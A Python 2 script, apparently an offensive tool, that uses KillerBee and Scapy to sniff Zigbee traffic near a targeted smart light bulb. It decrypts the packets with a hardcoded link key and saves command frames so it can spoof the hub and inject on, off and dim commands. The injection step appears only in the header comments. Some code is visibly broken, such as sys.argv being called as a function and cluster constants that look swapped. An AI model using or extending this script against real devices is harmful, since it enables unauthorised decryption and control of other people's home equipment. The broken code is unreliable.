__author__ = 'Soteria'

# 1. Sniff link-status and route request messages
# 2. Extract relevant sequence numbers:
    ## IEEE sequence number
    ## zigbee NWK sequence number
    ## security header - Frame Counter
# 3. Create new packet:
# 4. Change sequence numbers in the new packet
# 5. Create new packet data
# 6. Encrypt the data with the keyc1
# 7. Inject!

import dill  # In order to save and load packet from file
import PrintHelper
import logging
log_killerbee = logging.getLogger('scapy.killerbee')
import struct
try:
	from scapy.all import *
except ImportError:
	print 'This Requires Scapy To Be Installed.'
	from sys import exit
	exit(-1)

from killerbee import *
from killerbee.scapy_extensions import *
del hexdump
from scapy.utils import hexdump				# Force using Scapy's hexdump()
import os


# STATIC DEFAULTS:
TARGET_DEVICE_ID = "45BA" # "F973" # light bulb to be hacked
DEFAULT_KB_CHANNEL = 11
DEFAULT_KB_DEVICE = '10.10.10.2'
SOURCE_DEVICE_ID = '0x0000' # Spoofed device ID (smart hub)
command_packet_file = "dim_packet_format"
TURN_ON_COMMAND_CODE = 1
TURN_OFF_COMMAND_CODE = 0
DEFAULT_COMMAND = TURN_ON_COMMAND_CODE
LEVEL_CONTROL_CLUSTER = 6
ON_OFF_CLUSTER = 8
DEFAULT_CLUSTER = ON_OFF_CLUSTER
LOW_DIM_VALUE = '\x03\x0f\x00'
HIGH_DIM_VALUE = '\xff\x0f\x00'
LINK_KEY = '\xdf\x42\xb5\x95\x6a\x2b\xbd\x46\x18\x8d\x59\x0a\xdb\x04\xb6\x09'


# DYNAMIC DEFAULTS:
DEFAULT_LAST_ZIGBEE_APP_LAYER_COUNTER = 163
DEFAULT_LAST_ZIGBEE_CLUSTER_SEQ_NUM = 15


command = DEFAULT_COMMAND
cluster_type = DEFAULT_CLUSTER
if len(sys.argv) < 2:
    print "No command specified, turning on"
else:
    user_input_command = sys.argv(1)
    if len(sys.argv) == 3:
        user_input_command_arg = sys.argv(2)
    if (user_input_command.lower()) == "on":
        command = TURN_ON_COMMAND_CODE
        print "Command: Turn on"
    elif user_input_command.lower() == "off":
        command = TURN_OFF_COMMAND_CODE
        print "Command: Turn off"
    elif user_input_command.lower() == "dim":
        cluster_type = LEVEL_CONTROL_CLUSTER
        command = TURN_OFF_COMMAND_CODE
        if (user_input_command_arg.lower() == "down"):
            dim_value = LOW_DIM_VALUE
            print "Command: Dim down"
        elif (user_input_command_arg.lower() == "up"):
            dim_value = HIGH_DIM_VALUE
            print "Command: Dim up"



# Sniff packets to a list, print it to screen and extract data:
print "Sniffing broadcast packets..."
found_hub_link_status = False
while not found_hub_link_status:
    packetsList = kbtshark(channel = DEFAULT_KB_CHANNEL, count = 1, iface = DEFAULT_KB_DEVICE, store = 1)
    encrypted_command_packet = packetsList[0]

    # Extracting the MIC from the packet payload:
    encrypted_command_packet.mic = encrypted_command_packet.payload.payload.payload.fields['data'][-6:-2]
    # Omitting the data by 6 (to get rid of the FCS + MIC):
    encrypted_command_packet.payload.payload.payload.fields['data'] = encrypted_command_packet.payload.payload.payload.fields['data'][:-6]
    print "Payload is encrypted!"
    print "Decrypting message..."
    print "Encrypted: " + encrypted_command_packet.payload.payload.payload.fields['data'].encode('hex')
    decrypted_command_packet_payload = kbdecrypt(encrypted_command_packet, key = LINK_KEY, verbose = 0)
    PrintHelper.reaviling_string("Decrypted: ", decrypted_command_packet_payload.do_build().encode('hex'), 0)
    print ""
    if (len(decrypted_command_packet_payload.do_build().encode('hex')) == 30):
        print "Got it"
        # Save packet
        dill.dump(encrypted_command_packet, open(command_packet_file, "w"))
    if (decrypted_command_packet_payload.fields.__contains__('cluster')):
        if decrypted_command_packet_payload.fields['cluster'] == 8:
            if (decrypted_command_packet_payload.payload.fields.__contains__('load')):
                print "Got it"
                # Save packet
                dill.dump(encrypted_command_packet, open(command_packet_file, "w"))
